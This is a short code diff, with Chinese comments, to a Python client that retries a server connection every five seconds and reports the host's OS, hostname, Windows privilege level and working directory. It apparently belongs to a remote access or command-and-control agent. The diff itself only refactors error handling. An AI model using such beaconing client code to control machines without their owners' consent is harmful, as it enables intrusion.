@@ -24,6 +24,12 @@ class Client:
         # 连接失败等待5秒后重新连接
         while not self.server.connect(self.address):
             time.sleep(5)
+        # 获取进程权限
+        integrity_level = None
+        try:
+            integrity_level = win32util.get_integrity_level(os.getpid())
+        except:
+            pass
         # 发送验证信息
         info = {
             # 操作系统
@@ -31,7 +37,7 @@ class Client:
             # 主机名
             'hostname': socket.gethostname(),
             # 权限
-            'integrity': win32util.get_integrity() if os.name == 'nt' else 'N/A'
+            'integrity': integrity_level if os.name == 'nt' else 'N/A'
         }
         self.server.send_result(1, json.dumps(info))
 
@@ -44,7 +50,7 @@ class Client:
                 # 向服务端发送当前工作目录的路径
                 self.server.send_result(1, os.getcwd())
             # 连接断开
-            except ConnectionResetError:
+            except socket.error:
                 # 关闭套接字
                 self.server.close()
                 # 重新创建套接字
